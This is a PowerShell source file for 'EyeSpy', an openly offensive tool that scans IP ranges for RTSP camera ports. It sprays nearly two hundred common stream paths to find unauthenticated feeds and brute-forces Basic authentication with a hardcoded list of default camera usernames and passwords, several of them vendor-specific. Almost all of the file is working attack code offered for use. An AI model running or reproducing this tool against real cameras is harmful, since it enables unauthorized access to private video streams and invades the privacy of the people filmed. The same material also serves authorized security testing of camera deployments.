function EyeSpy {

    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Scan,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$FullAuto,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$PathScan,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$Help

    )

    if ($Help) {

        $HelpOutput = @("
[ Help ] ================================================
         _______             _______             
        |    ___.--.--.-----|     __.-----.--.--.
        |    ___|  |  |  -__|__     |  _  |  |  |
        |_______|___  |_____|_______|   __|___  |
                |_____|             |__|  |_____|   
                      
         By: Miiden 
         GitHub: https://github.com/Miiden

=========================================================
 EyeSpy is a tool to enumerate and gain access to
 IP Cameras via RTSP 


 Example Usage:

 EyeSpy -Scan 192.168.0.123
 Eyespy -FullAuto 192.168.0.1/24

=========================================================
")

        $HelpOutput | Write-Output
        return

    }

    $Banner = @("
=========================================================
         _______             _______             
        |    ___.--.--.-----|     __.-----.--.--.
        |    ___|  |  |  -__|__     |  _  |  |  |
        |_______|___  |_____|_______|   __|___  |
                |_____|             |__|  |_____|   
                      
         By: Miiden 
         GitHub: https://github.com/Miiden
=========================================================
    ")

    if (!$Scan -and !$FullAuto -and -!$PathScan) {
    
        Write-Host
        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
        Write-Host "You must provide either -Scan or -FullAuto"
    
        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
        Write-Host "Run ""EyeSpy -Help"" for command line usage"
        Write-Host
    
        return
    
    }

$Banner

#Function to Get Valid IP address ranges when supplied with a CIDR
function Get-IpRange {
        [CmdletBinding(ConfirmImpact = 'None')]
        Param(
            [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
            [string[]] $Target
        )

        process {
            $Computers = @()
            foreach ($subnet in $Target) {
                if ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$') {
                    # Treat as a single IP address
                    $Computers += $subnet
                }
                elseif ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}/\b(1[6-9]|2[0-9]|3[0-2])\b$') {
                    # CIDR notation processing
                    $IP = ($subnet -split '\/')[0]
                    [int]$SubnetBits = ($subnet -split '\/')[1]
                    if ($SubnetBits -lt 16 -or $SubnetBits -gt 30) {
                        Write-Warning -Message 'Enter a CIDR value between 16 and 30'
                        return
                    }
                    $Octets = $IP -split '\.'
                    $IPInBinary = @()
                    foreach ($Octet in $Octets) {
                        $OctetInBinary = [convert]::ToString($Octet, 2).PadLeft(8, '0')
                        $IPInBinary += $OctetInBinary
                    }
                    $IPInBinary = $IPInBinary -join ''
                    $HostBits = 32 - $SubnetBits
                    $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)

                    $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 1 # -1 to remove broadcast address
                    For ($i = 1; $i -le $imax; $i++) {
                        $NextHostIDInDecimal = $i
                        $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal, 2).PadLeft($HostBits, '0')
                        $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary
                        $IP = @()
                        For ($x = 0; $x -lt 4; $x++) {
                            $StartCharNumber = $x * 8
                            $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber, 8)
                            $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary, 2)
                            $IP += $IPOctetInDecimal
                        }
                        $IP = $IP -join '.'
                        $Computers += $IP
                    }
                }
                else {
                    Write-Host -ForegroundColor red "Value`: [$subnet] is not in a valid format"
                    return
                }
            }
            # Remember: Only returns an IP list, not active hosts.
            return $Computers
        }
}

#Function to generate b64 credentials for all known default/common username and password combinations
function GenerateCreds {

    $UserList = @("Admin", "admin", "admin1", "administrator", "Administrator",
                "aiphone", "root", "Root", "service", "supervisor", "ubnt"
                )

    $PassList = @("", "0000", "00000", "1111", "111111", "1111111",
                "123", "1234", "12345", "123456", "1234567", "12345678",
                "123456789", "12345678910", "4321", "666666", "6fJjMKYx",
                "888888", "9999", "admin", "admin pass", "Admin", "admin123",
                "administrator", "Administrator", "aiphone", "camera",
                "Camera", "fliradmin", "GRwvcj8j", "hikvision", "hikadmin",
                "HuaWei123", "ikwd", "jvc", "kj3TqCWv", "meinsm", "pass",
                "Pass", "password", "password123", "qwerty", "qwerty123",
                "Recorder", "reolink", "root", "service", "supervisor",
                "support", "system", "tlJwpbo6", "toor", "tp-link", "ubnt",
                "user", "wbox", "wbox123", "Y5eIMz3C"
                )

    $authString = @()

                foreach ($user in $UserList){
                    foreach ($pass in $PassList) {
                    $authString += [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$pass")) 
                    }              
                }

    Write-Host -NoNewline -ForegroundColor Green "[+] "
    Write-Host -NoNewline "Creds Total: "
    Write-Host -ForegroundColor Green $authString.Count
    return $authString
}

#Function to check if a default/common RTSP port is open 554, 8554, 5554
function PortScan {
    [CmdletBinding(ConfirmImpact = 'None')]
    Param(
        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
        [string[]] $Target
    )

    $Ports = @(554, 8554, 5554)
    $Timeout = 300
    $MaxThreads = 30  # Set the desired maximum number of threads
    $ReturnedResult = @()

    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads)
    $runspacePool.Open()
    $runspaces = New-Object System.Collections.ArrayList

    $scriptBlock = {
        param ($Target, $Timeout, $Port)

        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $asyncResult = $tcpClient.BeginConnect($Target, $Port, $null, $null)
        $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

        if ($wait) {
            try {
                $tcpClient.EndConnect($asyncResult)
                if ($tcpClient.Connected) {
                    #Port Open
                    $tcpClient.Close()
                    $tcpClient.Dispose()
                    return "$Target`:$Port"
                }
            }
            catch {
                #Errorhandling Catch
                $tcpClient.Close()
                $tcpClient.Dispose()
                return "Error with Connection"
            }
        }
        else {
            #Port Closed
            $tcpClient.Close()
            $tcpClient.Dispose()
            return "Error with Connection"
        }
    }

    foreach ($Computer in $Target) {
        foreach ($Port in $Ports) {
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Timeout).AddArgument($Port)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                Runspace     = $runspace
                Handle       = $runspace.BeginInvoke()
                ComputerName = $Computer
                Port         = $Port
                Completed    = $false
            })
        }
    }

    do {
        $runspacesToStart = @($runspaces | Where-Object { -not $_.Completed -and -not $_.Handle.IsCompleted })
        if ($runspacesToStart.Count -lt $MaxThreads) {
            # Start new runspaces here
        }

        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
            if ($runspace.Handle.IsCompleted) {
                $runspace.Completed = $true
                $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                $runspace.Runspace.Dispose()

                $runspaces.Remove($runspace)
                $runspace.Handle.AsyncWaitHandle.Close()

                if ($result -eq "Error with Connection") {
                    continue
                }
                else {
                    $ReturnedResult += $result
                }
            }
        }

        Start-Sleep -Milliseconds 100
    } while ($runspaces.Count -gt 0)

    $runspacePool.Close()
    $runspacePool.Dispose()
    return $ReturnedResult
}
#Function outlines the Runtime Environments when Enumerating common IP Camera URL Paths
function PathAttack {
    [CmdletBinding(ConfirmImpact = 'None')]
    Param(
        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
        [string[]] $Targets,

        [Parameter()]
        [int] $Timeout = 100
    )

    $Paths = @( "", "MyStream", "/live/ch01_0", "0/1", "1/main", "0/video1", "1", "1.AMP", "1/h264major", "1/stream1",
        "11", "12", "125", "1080p", "1440p", "480p", "4K", "666", "720p", "AVStream1_1", "CAM_ID.password.mp2",
        "CH001.sdp", "GetData.cgi", "HD", "HighResolutionVideo", "LowResolutionVideo", "MediaInput/h264",
        "MediaInput/mpeg4", "ONVIF/MediaInput", "StdCh1", "Streaming/Channels/1", "Streaming/Unicast/channels/101",
        "VideoInput/1/h264/1", "VideoInput/1/mpeg4/1", "access_code", "access_name_for_stream_1_to_5",
        "api/mjpegvideo.cgi", "av0_0", "av2", "avc", "avn=2", "axis-media/media.amp", "axis-media/media.amp?camera=1",
        "axis-media/media.amp?videocodec=h264", "cam", "cam/realmonitor", "cam/realmonitor?channel=0&subtype=0",
        "cam/realmonitor?channel=1&subtype=0", "cam/realmonitor?channel=1&subtype=1",
        "cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif", "cam0", "cam0_0", "cam0_1", "cam1",
        "cam1/h264", "cam1/h264/multicast", "cam1/mjpeg", "cam1/mpeg4", "cam1/mpeg4?user='username'&pwd='password'",
        "cam1/onvif-h264", "camera.stm", "ch0", "ch00/0", "ch001.sdp", "ch01.264", "ch01.264?", "ch01.264?ptype=tcp",
        "ch1_0", "ch2_0", "ch3_0", "ch4_0", "ch1/0", "ch2/0", "ch3/0", "ch4/0", "ch0_0.h264", "ch0_unicast_firststream",
        "ch0_unicast_secondstream", "ch1-s1", "channel1", "gnz_media/main", "h264", "h264.sdp", "h264/ch1/sub/av_stream",
        "h264/media.amp", "h264Preview_01_main", "h264Preview_01_sub", "h264_vga.sdp", "h264_stream", "image.mpg", "img/media.sav",
        "img/media.sav?channel=1", "img/video.asf", "img/video.sav", "ioImage/1", "ipcam.sdp", "ipcam_h264.sdp", "ipcam_mjpeg.sdp",
        "live", "live.sdp", "live/av0", "live/ch0", "live/ch00_0", "live/ch01_0", "live/h264", "live/main", "live/main0", "live/mpeg4",
        "live1.sdp", "live3.sdp", "live_mpeg4.sdp", "live_st1", "livestream", "main", "media", "media.amp", "media.amp?streamprofile=Profile1",
        "media/media.amp", "media/video1", "medias2", "mjpeg/media.smp", "mp4", "mpeg/media.amp", "mpeg4", "mpeg4/1/media.amp",
        "mpeg4/media.amp", "mpeg4/media.smp", "mpeg4unicast", "mpg4/rtsp.amp", "multicaststream", "now.mp4", "nph-h264.cgi",
        "nphMpeg4/g726-640x", "nphMpeg4/g726-640x48", "nphMpeg4/g726-640x480", "nphMpeg4/nil-320x240", "onvif-media/media.amp",
        "onvif1", "play1.sdp", "play2.sdp", "profile1/media.smp", "profile2/media.smp", "profile5/media.smp", "rtpvideo1.sdp", "rtsp_live0", "rtsp_live1",
        "rtsp_live2", "rtsp_tunnel", "rtsph264", "rtsph2641080p", "snap.jpg", "stream", "stream/0", "stream/1", "stream/live.sdp",
        "stream.sdp", "stream1", "streaming/channels/0", "streaming/channels/1", "streaming/channels/101", "tcp/av0_0", "test",
        "tmpfs/auto.jpg", "trackID=1", "ucast/11", "udpstream", "user.pin.mp2", "v2", "video", "video.3gp", "video.h264", "video.mjpg",
        "video.mp4", "video.pro1", "video.pro2", "video.pro3", "video0", "video0.sdp", "video1", "video1.sdp",
        "videoMain", "videoinput_1/h264_1/media.stm", "videostream.asf", "vis", "wfov"
    )

    $MaxThreads = 15  # Set the desired maximum number of threads
    $ReturnedResult = @()

    $Semaphore = New-Object Threading.Semaphore($MaxThreads, $MaxThreads)

    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads)
    $runspacePool.Open()
    $runspaces = New-Object System.Collections.ArrayList

    Write-Host -NoNewline -ForegroundColor Green "[+] "
    Write-Host -NoNewline "Paths Total: "
    Write-Host -ForegroundColor Green $Paths.Count

    $scriptBlock = {
        param (
            $IP,
            $Timeout,
            $Port,
            $Path,
            $Semaphore
        )

        # Acquire a semaphore slot
        $Semaphore.WaitOne() | Out-Null

        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $tcpClient.ReceiveTimeout = $Timeout
            $tcpClient.SendTimeout = $Timeout

            Write-Verbose "Connecting to $IP`:$Port/$Path"
            $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)

                    if ($tcpClient.Connected) {
                        # Port Open
                        Write-Verbose "Port $Port open on $IP"
                        $Stream = $tcpClient.GetStream()
                        $Reader = New-Object System.IO.StreamReader($Stream)
                        $Reader.BaseStream.ReadTimeout = $Timeout
                        $Writer = New-Object System.IO.StreamWriter($Stream)

                        $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
                        $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
                                   "CSeq: 2$CRLF$CRLF"

                        Write-Verbose "Sending request: $request"
                        $Writer.Write($request)
                        $Writer.Flush()

                        $response = ''
                        try {
                            Start-Sleep -Milliseconds 100
                            while ($Stream.CanRead) {
                                $line = $Reader.ReadLine()
                                if ($null -eq $line) { break }
                                $response += $line + $CRLF
                            }
                        } catch [System.IO.IOException] {
                            # Catching the exception without taking any action
                            Write-Warning "IOException occurred while reading response for $IP`:$Port/$Path"
                        }

                        # Extract the status code from the first line
                        $statusLine = $response.Split([Environment]::NewLine)[0]
                        $statusCode = ($statusLine -split ' ')[1].Trim()

                        $Reader.Dispose()
                        $Writer.Dispose()
                        $Stream.Dispose()
                        $tcpClient.Close()

                        Write-Verbose "Received status code: $statusCode for $IP`:$Port/$Path"
                        return @($IP, $Port, $Path, $statusCode)
                    }
                } catch {
                    # Errorhandling Catch
                    Write-Warning "Error occurred while connecting to $IP`:$Port/$Path`: $($_.Exception.Message)"
                    if ($tcpClient.Connected) {
                        $tcpClient.Close()
                    }
                }
            } else {
                # Port Closed
                Write-Verbose "Port $Port closed on $IP"
                if ($tcpClient.Connected) {
                    $tcpClient.Close()
                }
            }

            # Lots of Threads, but this Sleep slows down the connections just a little bit
            # Hopefully Preventing Denial of Service - Perhaps add this as a switch, 100 default or something, an idea...
            Start-Sleep -Milliseconds 100

        } catch {
            # General exception handling
            Write-Warning "General exception occurred: $($_.Exception.Message)"
        } finally {
            # Release the semaphore slot
            $Semaphore.Release()
        }
    }


foreach ($Target in $Targets) {
    $IP, $Port = $Target -split ':'

    foreach ($Path in $Paths) {

        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path).AddArgument($Semaphore)
        $runspace.RunspacePool = $runspacePool

        [void]$runspaces.Add([PSCustomObject]@{
            Runspace     = $runspace
            Handle       = $runspace.BeginInvoke()
            ComputerName = $IP
            Port         = $Port
            Path         = $Path
            Completed    = $false
        })
    }

}

do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        if ($runspace.Handle.IsCompleted) {
            try {
                $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                $runspace.Completed = $true
                if ($result -eq "Error with Connection") {
                    continue
                } else {
                    # Check HTTP status code
                    $statusCode = $result[3]
                    $concat = $result[0] + ":" + $result[1] + "/" + $result[2]
                    if ($statusCode -eq "200") {
                        # No Auth Path Found
                        Write-Host -ForegroundColor Green "No Authentication Required: $concat"
                    } elseif ($statusCode -eq "401" -or $statusCode -eq "403") {
                        # Authentication Required
                        #Write-Host -ForegroundColor Yellow "Authentication Required: $concat"
                        $ReturnedResult += $concat
                    } else {
                        # Should catch and discard any other status codes including 404
                        continue
                    }
                }
            } catch {
                Write-Warning "Error occurred: $_"
            } finally {
                $runspace.Runspace.Dispose()
                $runspace.Handle.AsyncWaitHandle.Close()
            }
        }
    }
} while ($runspaces.Where({ -not $_.Completed }).Count -gt 0)

# Dispose of runspaces
foreach ($runspace in $runspaces) {
    $runspace.Runspace.Dispose()
    $runspace.Handle.AsyncWaitHandle.Close()
}
$runspaces.Clear()

# Close and dispose of runspace pool
$runspacePool.Close()
$runspacePool.Dispose()

return $ReturnedResult

}
#Function outlines the Runtime Environments when Attempting to Spray Common IP Camera Credentials
function AuthAttack {
    [CmdletBinding(ConfirmImpact = 'None')]
    Param(
        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
        [string[]] $Targets
    )

    [array]$creds = GenerateCreds

    $Timeout = 100
    $MaxThreads = 15  # Set the desired maximum number of threads
    $ReturnedResult = @()

    $Semaphore = New-Object Threading.Semaphore($MaxThreads, $MaxThreads)

    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads)
    $runspacePool.Open()
    $runspaces = New-Object System.Collections.ArrayList

    $scriptBlock = {
        param ($IP, $Timeout, $Port, $Path, $cred, $SuccessFlag)

        # Acquire a semaphore slot
        $Semaphore.WaitOne()

        try {
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)
                    if ($tcpClient.Connected) {
                        # Port Open
                        $Stream = $tcpClient.GetStream()
                        $Reader = New-Object System.IO.StreamReader($Stream)
                        $Reader.BaseStream.ReadTimeout = $Timeout
                        $Writer = New-Object System.IO.StreamWriter($Stream)

                        $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
                        $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
                                   "CSeq: 2$CRLF" +
                                   "Authorization: Basic $cred$CRLF$CRLF"

                        $Writer.Write($request)
                        $Writer.Flush()

                        $response = ''
                        try {
                            Start-Sleep -Milliseconds 100
                            while ($Stream.CanRead) {
                                $line = $Reader.ReadLine()
                                if ($null -eq $line) { break }
                                $response += $line + $CRLF
                            }
                        } catch [System.IO.IOException] {
                            # Catching the exception without taking any action
                        }

                        # Extract the status code from the first line
                        $statusLine = $response.Split([Environment]::NewLine)[0]
                        $statusCode = ($statusLine -split ' ')[1].Trim()

                        $Reader.Dispose()
                        $Writer.Dispose()
                        $Stream.Dispose()
                        $tcpClient.Close()

                        return @($IP, $Port, $Path, $statusCode, $cred)
                    }
                }
                catch {
                    # Errorhandling Catch
                    if ($tcpClient.Connected) {
                        $tcpClient.Close()
                    }
                }
            }
            else {
                # Port Closed
                if ($tcpClient.Connected) {
                    $tcpClient.Close()
                }
            }

            # Lots of Threads, but this Sleep slows down the connections just a little bit
            # Hopefully Preventing Denial of Service - Perhaps add this as a switch, 100 default or something, an idea...
            Start-Sleep -Milliseconds 100

        }
        catch {
            # General exception handling
        }
        finally {
            # Release the semaphore slot
            $Semaphore.Release()
        }
    }

    $successFound = $false  # Flag to track if successful result is found

    foreach ($Target in $Targets) {
        $successFound = $false  # Reset flag for each target
        $IP, $Port, $Paths = $Target -split "[:/]", 3

        foreach ($Path in $Paths) {
            foreach ($cred in $creds) {
                if (!$successFound) {
                    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path).AddArgument($cred).AddArgument([ref]$successFound)
                    $runspace.RunspacePool = $runspacePool

                    [void]$runspaces.Add([PSCustomObject]@{
                        Runspace     = $runspace
                        Handle       = $runspace.BeginInvoke()
                        Creds        = $cred
                        ComputerName = $IP
                        Port         = $Port
                        Path         = $Path
                        Completed    = $false
                    })
                }
            }
        }
    }

    do {
        $runspacesToStart = @($runspaces | Where-Object { -not $_.Completed -and -not $_.Handle.IsCompleted })
        if ($runspacesToStart.Count -gt 0) {
            # Wait for a runspace to complete before starting new ones
            $runspace = $runspacesToStart[0]
            $runspace.Handle.AsyncWaitHandle.WaitOne() | Out-Null
        }

        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
            if ($runspace.Handle.IsCompleted) {
                $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                $runspace.Runspace.Dispose()
                $runspace.Completed = $true
                $runspace.Handle.AsyncWaitHandle.Close()

                if ($result -eq "Error with Connection") {
                    continue
                }
                elseif ($result[3] -eq "200") {
                    $concat = $result[0] + ":" + $result[1] + "/" + $result[2]
                    $foundCreds = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($result[4]))
                    # Basic Auth Credentials Found
                    Write-Host -NoNewline -ForegroundColor Green "Credentials Found: $concat -> "
                    Write-Host "$foundCreds"
                    $successFound = $true  # Set flag to true if successful result is found
                    break
                }
                else {
                    # Should catch and discard any other status codes including 404
                    continue
                }
            }
        }

        Start-Sleep -Milliseconds 100
    } while ($runspaces.Count -gt 0 -and !$successFound)

    # Close and dispose of all existing runspaces
    foreach ($runspace in $runspaces) {
        if (-not $runspace.Completed) {
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    $runspaces.Clear()
    $runspacePool.Close()
    $runspacePool.Dispose()
    return $ReturnedResult
}



[array]$AlivePorts = @()

if ($Scan) {
    $IpAddr = Get-IpRange -Target $Scan
    $AlivePorts += PortScan -Target $IpAddr

    if ($AlivePorts.Length -eq 0) {
        Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
        return
    }
    else {
        Write-Host "Open RTSP Ports Found:"
        Write-Host -ForegroundColor Green ($AlivePorts -join "`n")
    }
    return
}

if ($PathScan) {
    $IpAddr = Get-IpRange -Target $PathScan
    $AlivePorts += PortScan -Target $IpAddr

    if ($AlivePorts) {
        Write-Host "Open RTSP Ports Found:"
        Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
        Write-Host "Spraying Paths:"
        Start-Sleep -Milliseconds 500
        $PathsToAttack = PathAttack -Targets $AlivePorts

        if ($PathsToAttack) {
            # Print the Possible Paths to the Host
            Write-Host -ForegroundColor Yellow ($PathsToAttack -join "`n")"`n"

        }
        else {
            Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
        }
    }
    else {
        Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
    }
    return
}

if ($FullAuto) {
    $IpAddr = Get-IpRange -Target $FullAuto
    $AlivePorts += PortScan -Target $IpAddr

    if ($AlivePorts) {
        Write-Host "Open RTSP Ports Found:"
        Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
        Write-Host "Spraying Paths and Credentials:"
        Start-Sleep -Milliseconds 500
        $PathsToAttack = PathAttack -Targets $AlivePorts

        if ($PathsToAttack) {
            # Run the AuthAttack function
            AuthAttack -Targets $PathsToAttack
        }
        else {
            Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
        }
    }
    else {
        Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
    }
    return
}

}
#EyeSpy -FullAuto 192.168.0.219
